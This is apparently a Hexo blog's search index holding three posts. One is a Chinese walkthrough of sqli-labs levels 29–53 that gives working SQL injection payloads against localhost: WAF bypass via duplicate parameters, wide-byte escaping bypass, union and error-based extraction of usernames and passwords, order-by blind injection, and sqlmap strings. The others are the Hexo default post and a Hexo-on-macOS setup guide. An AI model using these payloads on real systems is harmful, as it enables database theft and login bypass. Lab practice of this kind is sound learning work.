<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2023/05/23/hello-world/"/>
      <url>/2023/05/23/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqli-lab:Less29-53记录</title>
      <link href="/2017/12/09/sqli-lab-Less29-53%E8%AE%B0%E5%BD%95/"/>
      <url>/2017/12/09/sqli-lab-Less29-53%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>最近开始学习注入，从sqli-lab的题入手。前面1-28是跟着教程做的，学习了注入基本的方法和思路。后面试着自己做一下，同时留下思路和笔记。</p><h2 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h2><h3 id="GET受WAF保护单引号注入"><a href="#GET受WAF保护单引号注入" class="headerlink" title="GET受WAF保护单引号注入"></a>GET受WAF保护单引号注入</h3><p>测试：</p><p><img src="/img/sql/21.png"></p><p>结果跳转到了另一个页面,结合登录网站的图片提示，我们知道有waf。看看源码。</p><p><img src="/img/sql/12.png"></p><p>看看<code>java_implimentation</code>和<code>whitelist</code>这个两个处理传入参数的函数。</p><p><img src="/img/sql/1.png"></p><p>java_implimentation用来解析查询字符串，用<code>&amp;</code>分割参数，并只返回参数<code>id</code>的值且只返回第一次。</p><p><img src="/img/sql/guolv.png"></p><p>这是主要的检测函数，检测传入的参数是否是一个纯数字，如果不是，则判定为非法字符，跳转到特殊页面。</p><p>根据WAF规则构造出payload：</p><blockquote><p><a href="http://localhost/Less-29/login.php?id=0%5C&id=0%E2%80%98">http://localhost/Less-29/login.php?id=0\&amp;id=0‘</a>“) union select 1,2,3 –+</p></blockquote><p>前一个<code>id=0</code>用于绕过waf，而代码中执行的sql语句使用的是<code>$_GET[&#39;id&#39;]</code>,这个值取的是最后一个GET的id的值，也就是payload中&amp;后面的id的值。</p><h2 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h2><h3 id="GET受WAF保护双引号注入"><a href="#GET受WAF保护双引号注入" class="headerlink" title="GET受WAF保护双引号注入"></a>GET受WAF保护双引号注入</h3><p>这一关跟上一关差不多，区别在于sql语句使用的参数加了双引号。如下payload可以检测出：</p><blockquote><p><a href="http://localhost/Less-30/login.php?id=1%5C&id=1%22">http://localhost/Less-30/login.php?id=1\&amp;id=1%22</a>“</p></blockquote><p><img src="/img/sql/error.png"></p><p>构造payload：</p><blockquote><p><a href="http://localhost/Less-30/login.php?id=1%5C&id=0%22%20union%20select%201,2,3%20--+">http://localhost/Less-30/login.php?id=1\&amp;id=0%22%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h2><h3 id="GET受WAF保护括号注入"><a href="#GET受WAF保护括号注入" class="headerlink" title="GET受WAF保护括号注入"></a>GET受WAF保护括号注入</h3><p>跟上面大同小异,从报错可以看出参数闭合的方式。 &amp;#x20;<br>payload：</p><blockquote><p><a href="http://localhost/Less-31/login.php?id=1%5C&id=0%22)%20union%20select%201,2,3%20--+%22)%20union%20select%201,2,3%20--+">http://localhost/Less-31/login.php?id=1\&amp;id=0%22)%20union%20select%201,2,3%20--+&quot;)%20union%20select%201,2,3%20--+</a>)</p></blockquote><h2 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h2><h3 id="GET字符型addslashes绕过注入"><a href="#GET字符型addslashes绕过注入" class="headerlink" title="GET字符型addslashes绕过注入"></a>GET字符型addslashes绕过注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-32/?id=1%EF%BF%BD%27">http://localhost/Less-32/?id=1%df%27</a>“</p></blockquote><p><img src="/img/sql/error1.png"></p><p>从报错看出单引号被添加了一个斜杠。</p><p>源码：</p><p><img src="/img/sql/so.png"></p><p><code>check_addslashes</code>函数：</p><p><img src="/img/sql/han.png"></p><p>参数经过<code>check_addslashes</code>函数处理，斜杠和单双引号都被添加了斜杠转义。看到执行了<code>SET NAMES gbk</code>，想到可以使用宽字节注入绕过。</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-32/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-32/?id=0%df%27%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h2><h3 id="GET字符型addslashes绕过注入-1"><a href="#GET字符型addslashes绕过注入-1" class="headerlink" title="GET字符型addslashes绕过注入"></a>GET字符型addslashes绕过注入</h3><p>和Less-32注入方法一模一样，查看源码区别在于<code>check_addslashes</code>使用了php自带的函数<code>addslashes</code>，观察实际使用效果结合查询手册，学习了addslashes函数的原理。和绕过方法。</p><h2 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h2><h3 id="POST字符型addslashes绕过注入"><a href="#POST字符型addslashes绕过注入" class="headerlink" title="POST字符型addslashes绕过注入"></a>POST字符型addslashes绕过注入</h3><p>和之前GET的原理相同。区别在于数据改为POST传输。</p><p>在测试中，我直接用浏览器输入<code>1%df&#39;</code>不会报错，只有在bp的repeater中修改payload再POST出去才会报错。</p><p>使用bp抓包发现，在浏览器中POST的<code>1%df&#39;</code>会被编码为<code>1%25df</code>，即<code>%</code>被编码了。这样就无法构成宽字节了。</p><h2 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h2><h3 id="GET数字型addslashes绕过注入"><a href="#GET数字型addslashes绕过注入" class="headerlink" title="GET数字型addslashes绕过注入"></a>GET数字型addslashes绕过注入</h3><p>测试：</p><p><code>http://localhost/Less-35/?id=1%df%27</code></p><p>报错：</p><p><img src="/img/sql/error2.png"></p><p>源码：</p><p><img src="/img/sql/sou2.png"></p><p>发现是数字型的id，那么在注入时addslashes函数就不会起到什 &amp;#x20;<br>么作用。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+">http://localhost/Less-35/?id=0%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h2><h3 id="GET字符型mysql-real-escape-string绕过注入"><a href="#GET字符型mysql-real-escape-string绕过注入" class="headerlink" title="GET字符型mysql_real_escape_string绕过注入"></a>GET字符型mysql_real_escape_string绕过注入</h3><p>跟前几题类似，区别在于转义字符串的函数换成了<code>mysql_real_escape_string</code>,在参考手册中查一下。</p><p><img src="/img/sql/mysql_escape.png"></p><p>注入方法和之前的一样。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-36/?id=0%EF%BF%BD%27%20union%20select%201,2,3%20--+">http://localhost/Less-36/?id=0%df%27%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h2><h3 id="POST字符型mysql-real-escape-string绕过注入"><a href="#POST字符型mysql-real-escape-string绕过注入" class="headerlink" title="POST字符型mysql_real_escape_string绕过注入"></a>POST字符型mysql_real_escape_string绕过注入</h3><p>只是换了转义函数，注入方法同Less-34。</p><h2 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h2><h3 id="GET字符型层次化查询注入"><a href="#GET字符型层次化查询注入" class="headerlink" title="GET字符型层次化查询注入"></a>GET字符型层次化查询注入</h3><p>源码：</p><p><img src="/img/sql/stacked.png"></p><p>代码使用了<code>mysqli</code>拓展连接数据库的方式。<code>mysqli_multi_query</code>执行多个sql语句，以<code>；</code>分隔。<code>mysqli_more_results</code>检查是否还有查询数据。</p><p>payload：</p><p><a href="http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+">http://localhost/Less-38/?id=0%27%20union%20select%201,2,3%20--+</a>“</p><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><h3 id="GET数字型层次化查询注入"><a href="#GET数字型层次化查询注入" class="headerlink" title="GET数字型层次化查询注入"></a>GET数字型层次化查询注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+">http://localhost/Less-39/?id=0%22%20union%20select%201,2,3%20--+</a>“</p></blockquote><p>报错：</p><p><img src="/img/sql/error3.png"></p><p>判断应为数字型注入</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+">http://localhost/Less-39/?id=0%20union%20select%201,2,3%20--+</a>“</p></blockquote><h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><h3 id="GET括号字符型层次化查询盲注"><a href="#GET括号字符型层次化查询盲注" class="headerlink" title="GET括号字符型层次化查询盲注"></a>GET括号字符型层次化查询盲注</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-40/index.php?id=0%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+%22)%20or%201=1%20--+">http://localhost/Less-40/index.php?id=0%27)%20or%201=1%20--+&quot;)%20or%201=1%20--+</a>)</p></blockquote><p>前两个无回显，第三个登陆成功。</p><p>payload:</p><blockquote><p><a href="http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+%22)%20union%20select%201,2,3%20--+">http://localhost/Less-40/index.php?id=0%27)%20union%20select%201,2,3%20--+&quot;)%20union%20select%201,2,3%20--+</a>)</p></blockquote><h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><h3 id="GET数字型层次化查询盲注"><a href="#GET数字型层次化查询盲注" class="headerlink" title="GET数字型层次化查询盲注"></a>GET数字型层次化查询盲注</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-41/?id=0%27%20or%201=1%20--+">http://localhost/Less-41/?id=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-41/?id=0%20or%201=1%20--+">http://localhost/Less-41/?id=0%20or%201=1%20--+</a>“</p></blockquote><p>判定为数字型注入</p><p>payload:</p><blockquote><p>localhost&#x2F;Less-41&#x2F;?id&#x3D;0 union select 1,2,3 –+</p></blockquote><h2 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h2><h3 id="POST字符型基于错误的的层次化查询注入"><a href="#POST字符型基于错误的的层次化查询注入" class="headerlink" title="POST字符型基于错误的的层次化查询注入"></a>POST字符型基于错误的的层次化查询注入</h3><p>源码：</p><p><img src="/img/sql/escape0.png"></p><p>转义了用户名但没有转义密码，联想到之前Less-24的二次注入。但是发现这次不让注册了。。。看到会报错，尝试使用less-27学的基于报错的<code>updatexml</code>语法。</p><p>payload:</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;1’ or updatexml(1,concat(0x2829,(select version())),1) –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;1’ or extractvalue(1,concat(0x2829,(select version()),1) –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;1’ or updatexml(1,concat(0x2829,(select concat_ws(‘:’,id,username,password) from users limit 0,1)),1) –+&amp;mysubmit&#x3D;Login</p></blockquote><p>之后就可以登陆改密码啦。</p><h2 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h2><h3 id="POST加括号字符型基于错误的的层次化查询注入"><a href="#POST加括号字符型基于错误的的层次化查询注入" class="headerlink" title="POST加括号字符型基于错误的的层次化查询注入"></a>POST加括号字符型基于错误的的层次化查询注入</h3><p>测试：</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;0’) or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>测试出sql语句是<code>&#39;)</code>闭合，payload与上题类似。</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;1’） or updatexml(1,concat(0x2829,(select version())),1) –+&amp;mysubmit&#x3D;Login</p></blockquote><h2 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h2><h3 id="POST字符型层次化查询盲注"><a href="#POST字符型层次化查询盲注" class="headerlink" title="POST字符型层次化查询盲注"></a>POST字符型层次化查询盲注</h3><p>测试：</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;0” or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>发现这题没有回显了，使用boolenBased盲注。</p><p>payload:</p><blockquote><p>64 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>可以写脚本跑或是sqlmap跑</p><h2 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h2><h3 id="POST括号字符型层次化查询盲注"><a href="#POST括号字符型层次化查询盲注" class="headerlink" title="POST括号字符型层次化查询盲注"></a>POST括号字符型层次化查询盲注</h3><p>测试：</p><blockquote><p>login_user&#x3D;root&amp;login_password&#x3D;0’ or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p><p>login_user&#x3D;root&amp;login_password&#x3D;0’) or 1&#x3D;1 –+&amp;mysubmit&#x3D;Login</p></blockquote><p>测试出sql语句是<code>&#39;)</code>闭合，payload与上题类似。</p><p>payload：</p><blockquote><p>64 –+&amp;mysubmit&#x3D;Login</p></blockquote><h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><h3 id="GET数字型基于错误的orderby从句注入"><a href="#GET数字型基于错误的orderby从句注入" class="headerlink" title="GET数字型基于错误的orderby从句注入"></a>GET数字型基于错误的orderby从句注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a>“</p></blockquote><p>判断为数字型注入</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%20%20desc">http://localhost/Less-46/?sort=1%20%20desc</a>“</p></blockquote><p>orderby从句注入</p><p>源码：</p><p><img src="/img/sql/order.png"></p><p><code>order by</code>从句的注入，查了一下，感觉跟之前的也是大同小异。有报错还是可以使用<code>updatexml</code>或是<code>extractvalue</code>。</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%20or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a>“</p></blockquote><h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><h3 id="GET字符型基于错误的orderby从句注入"><a href="#GET字符型基于错误的orderby从句注入" class="headerlink" title="GET字符型基于错误的orderby从句注入"></a>GET字符型基于错误的orderby从句注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27%20or%201=1%20--+">http://localhost/Less-46/?sort=1%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-46/?sort=1%20%20or%201=1%20--+">http://localhost/Less-46/?sort=1%20%20or%201=1%20--+</a>“</p></blockquote><p>判断为字符型注入</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+">http://localhost/Less-46/?sort=1%27or%20%20updatexml(1,concat(0x2829,version()),1)%20--+</a>“</p></blockquote><h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><h3 id="GET数字型的orderby从句盲注"><a href="#GET数字型的orderby从句盲注" class="headerlink" title="GET数字型的orderby从句盲注"></a>GET数字型的orderby从句盲注</h3><p>测试:</p><blockquote><p><a href="http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(%E6%97%A0%E5%9B%9E%E6%98%BE)">http://localhost/Less-48/?sort=0%27%20or%201=1%20%20--+(无回显)</a></p><p><a href="http://localhost/Less-48/?sort=0%20or%201=1%20%20--+%EF%BC%88%E6%9C%89%E5%9B%9E%E6%98%BE%EF%BC%89">http://localhost/Less-48/?sort=0%20or%201=1%20%20--+（有回显）</a></p></blockquote><p>数字型</p><p>尝试了使用boolenBased注入。常规的boolenBased方式用不了，上网查了查</p><p>payload：</p><blockquote><p><a href="http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00">http://localhost/Less-48/?sort=(select+1+regexp+if(substring(database(),1,1)=0x73,1,0x00</a>“</p></blockquote><p>原理为1与<code>if</code>语句正则匹配，database()第一个字符&#x3D;0x73为真则if为1，则regexp匹配结果为1，否则为0。</p><p>sqlmap跑的payload：</p><blockquote><p>[<a href="http://localhost/Less-48/?sort=(select%5D(http://localhost/Less-48/?sort=(select)">http://localhost/Less-48/?sort=(select](http://localhost/Less-48/?sort=(select)</a>“)(case when (7459&#x3D;7459) then 7459 else 7459 *(select 7459 from information_schema.plugins) end))</p></blockquote><h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><h3 id="GET字符型orderby从句盲注"><a href="#GET字符型orderby从句盲注" class="headerlink" title="GET字符型orderby从句盲注"></a>GET字符型orderby从句盲注</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-49/?sort=0%20or%201=1">http://localhost/Less-49/?sort=0%20or%201=1</a>“</p></blockquote><p>payload：</p><blockquote><p><a href="http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+">http://localhost/Less-49/?sort=0%27%20%20or%20%201=(select+1+regexp+if(substring(database(),1,1)=0x72,1,0x00))%20--+</a>“</p></blockquote><p>sqlmap跑user()的盲注语句：</p><blockquote><ul><li>THEN 3452 ELSE 3452 _(SELECT 3452 FROM INFORMATION_SCHEMA.PLUGINS)<br>END))</li></ul></blockquote><h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><h3 id="GET数字型orderby从句层次化查询注入"><a href="#GET数字型orderby从句层次化查询注入" class="headerlink" title="GET数字型orderby从句层次化查询注入"></a>GET数字型orderby从句层次化查询注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-50/?sort=0%27%20or%201=1%20--+">http://localhost/Less-50/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-50/?sort=0%20or%201=1%20--+">http://localhost/Less-50/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-50/?sort=0%20desc--+">http://localhost/Less-50/?sort=0%20desc--+</a>“</p></blockquote><p>判断为数字型orderby从句注入</p><p>payload同<code>Less46</code></p><h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><h3 id="GET字符型orderby从句层次化查询注入"><a href="#GET字符型orderby从句层次化查询注入" class="headerlink" title="GET字符型orderby从句层次化查询注入"></a>GET字符型orderby从句层次化查询注入</h3><p>测试：</p><blockquote><p><a href="http://localhost/Less-51/?sort=0%27%20or%201=1%20--+">http://localhost/Less-51/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-51/?sort=0%20or%201=1%20--+">http://localhost/Less-51/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-51/?sort=0%27%20desc--+">http://localhost/Less-51/?sort=0%27%20desc--+</a>“</p></blockquote><p>单引号字符型orderby从句注入</p><p>payload同<code>Less-47</code></p><h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><h3 id="GET数字型orderby从句层次化查询盲注"><a href="#GET数字型orderby从句层次化查询盲注" class="headerlink" title="GET数字型orderby从句层次化查询盲注"></a>GET数字型orderby从句层次化查询盲注</h3><p>测试:</p><blockquote><p><a href="http://localhost/Less-52/?sort=0%27%20or%201=1%20--+">http://localhost/Less-52/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-52/?sort=0%20or%201=1%20--+">http://localhost/Less-52/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-52/?sort=0%27%20desc--+">http://localhost/Less-52/?sort=0%27%20desc--+</a>“</p></blockquote><p>数字型orderby从句注入</p><p>payload同Less-48</p><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><h3 id="GET字符型orderby从句层次化查询盲注"><a href="#GET字符型orderby从句层次化查询盲注" class="headerlink" title="GET字符型orderby从句层次化查询盲注"></a>GET字符型orderby从句层次化查询盲注</h3><p>测试:</p><blockquote><p><a href="http://localhost/Less-53/?sort=0%27%20or%201=1%20--+">http://localhost/Less-53/?sort=0%27%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-53/?sort=0%20or%201=1%20--+">http://localhost/Less-53/?sort=0%20or%201=1%20--+</a>“</p><p><a href="http://localhost/Less-53/?sort=0%27%20desc--+">http://localhost/Less-53/?sort=0%27%20desc--+</a>“</p></blockquote><p>字符型orderby从句注入</p><p>payload同Less-49</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>从这一部分中学到了一些<code>绕过注入</code>、<code>层次化查询注入</code>和<code>orderby从句注入</code>的一些思路。学到了很多东西，但是感觉这一部分的题目重复性有些偏大，套路有点单一。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Macos 上hexo部署及配置</title>
      <link href="/2017/10/22/Macos-%E4%B8%8Ahexo%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%85%8D%E7%BD%AE/"/>
      <url>/2017/10/22/Macos-%E4%B8%8Ahexo%E9%83%A8%E7%BD%B2%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Macos-上hexo部署及配置"><a href="#Macos-上hexo部署及配置" class="headerlink" title="Macos 上hexo部署及配置"></a>Macos 上hexo部署及配置</h1><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>之前是在阿里云上用WordPress搭的一个服务器。由于服务器快到期了，再加上Wordpress一直有爆漏洞,就决定使用静态页面挂在GitHub上搭博客了。使用的是Hexo，比较方便，而且主题也挺好看。用篇文章记录一下，顺便练习一下Markdown。</p><h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><h3 id="GitHub账号"><a href="#GitHub账号" class="headerlink" title="GitHub账号"></a>GitHub账号</h3><p>注册即可，无需翻墙。</p><h3 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h3><p><a href="http://nodejs.cn/download/" title="Node.js">Node.js</a> 官网下载安装即可。</p><h3 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h3><p>安装Xcode时，会自带Git，如果没有就安装下Xcode或者Xcode的工具。</p><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><p>首先创建一个放置博客系统的文件夹，这个文件夹就是你的博客的根目录，进入到文件夹，执行如下命令安装：</p><p><code>sudo npm install -g hexo</code></p><p>接着初始化：</p><p><code>hexo init</code></p><p>还需要安装一个上传博客到GitHub的工具：</p><p><code>npm install hexo-deployer-git --save</code></p><h2 id="0x02-GitHub配置"><a href="#0x02-GitHub配置" class="headerlink" title="0x02 GitHub配置"></a>0x02 GitHub配置</h2><h3 id="仓库创建"><a href="#仓库创建" class="headerlink" title="仓库创建"></a>仓库创建</h3><p>建立与你的GitHub账户名对应的仓库，仓库名为<code>Your_name.github.io</code>。</p><p>接着配置你的hexo与该账号关联，在当前目录中的_config.yml中：</p><p><img src="/img/hexoblog/1.png"></p><p><code>type</code>: <code>git</code></p><p><code>repo</code>： <code>https://github.com/Your_name/Your_name.github.io.git</code></p><p><code>branch</code>: <code>master</code></p><p>特别要注意的是yml文件中的每个冒号后面需要一个空格。</p><p>然后在命令行中，配置你的GitHub信息：</p><p><code>git config --global user.name &quot;Yourname&quot;</code></p><p><code>git config --global user.email &quot;YourEmail&quot;</code></p><p>然后在命令行中，创建SSH key:</p><p><code>ssh-keygen -t rsa -C &quot;YourEmail&quot;</code></p><p>然后:</p><p><code>cd ~/.ssh</code></p><p><code>cat id_rsa.pub</code></p><p>然后将这个文件的内容复制下来。进入到你的GitHub账号-&gt;Settings-&gt;SSH and GPG keys，点击<code>NewSSH Key</code>，<code>title</code>随便填，<code>key</code>填你刚才复制的东西。然后保存即可。</p><h2 id="0x03-博客配置"><a href="#0x03-博客配置" class="headerlink" title="0x03 博客配置"></a>0x03 博客配置</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><ul><li>hexo clean 清除静态文件(有些主题)<br>*   hexo generate 编译静态文件<br>*   hexo deploy 上传到你的GitHub<br>*   hexo server 在本地部署，在浏览器中输入localhost:4000即可预览<br>*   hexo new “文章名” 创建一篇文章，会在博客根目录下的source&#x2F;_post&#x2F;下生成一个<code>文章名.md</code>的文件，在这个md里编辑文章即可。</li></ul><p>一般上传就使用hexo g &amp;&amp; hexo d 即可</p><h3 id="基本配置"><a href="#基本配置" class="headerlink" title="基本配置"></a>基本配置</h3><p>都是在 _config.yml里配置：</p><ul><li><code>title</code>: <code>你的博客名字</code></li><li><code>language</code>: <code>zh-CN</code></li><li><code>theme</code>: <code>你要使用的主题，在根目录下的themes里</code></li></ul><h3 id="主题更换"><a href="#主题更换" class="headerlink" title="主题更换"></a>主题更换</h3><p>hexo有很多好看的主题，<a href="https://www.zhihu.com/question/24422335" title="知乎–有哪些好看的hexo主题">知乎–有哪些好看的hexo主题</a></p><p>选个喜欢的主题，它的GitHub上会有部署的教程。</p><p>基本步骤是，在博客的根目录下的themes目录下，创建你要使用的主题的文件夹，进入文件夹，然后git clone 主题的仓库地址。跟主题相关的配置一般都在该主题的文件夹下的_config.yml里。</p><p>别忘了在_config.yml里更改<code>theme</code>的值</p><h2 id="0x04-域名绑定"><a href="#0x04-域名绑定" class="headerlink" title="0x04 域名绑定"></a>0x04 域名绑定</h2><p>现在要想访问你的blog的地址是 Your_name.github.io,你可以绑定到你注册过的域名。</p><p>先改一下DNS解析，我是在阿里云买的,直接在阿里云的控制台里,更改我的域名的解析,记录类型是CNAME，就是一个跳转，主机记录是设置你的二级域名，记录值填你原来的博客地址。</p><p><img src="/img/hexoblog/2.png"></p><p>然后在你博客的根目录的<code>Source</code>文件夹下，创建一个<code>CNAME</code>文件，在文件里写下你购买的域名。</p><p>如我是<code>https://blog.yoyolllh.top</code></p><p>然后再 <code>hexo g &amp;&amp; hexo d</code> 重新上传一下就可以通过你的域名访问了。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>踩了许多的坑，小小总结一下</p><ul><li>在更换主题时，严格按照主题的README操作。</li><li>绑定域名记得一定要创建<code>CNAME</code>文件，光在GitHub上绑定域名没有用，每次你重新上传时它都会解除绑定。</li><li>使用 <code>hexo g --config source/_data/next.yml</code>重新指定配置文件生成静态文件。</li><li>有些主题配置后仍使用不了，可以试试 <code>hexo clean</code>命令。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
